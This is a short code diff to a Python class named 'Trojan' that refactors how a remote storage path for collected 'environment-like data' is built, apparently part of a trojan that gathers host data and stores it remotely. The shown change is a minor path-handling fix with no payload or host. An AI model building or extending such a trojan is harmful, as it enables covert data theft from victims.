@@ -5,6 +5,7 @@ import json
 import threading
 import time
 import random
+import os
 
 
 from datetime import datetime  
@@ -59,7 +60,7 @@ class Trojan:
         """
         try:
             message = datetime.now().isoformat()
-            remote_path = f'data/{self.id}/{message}.data'
+            remote_path = os.path.join('data', self.id, f'{message}.data')
 
             # Format environment-like data
             if isinstance(data, dict) or hasattr(data, 'keys'):
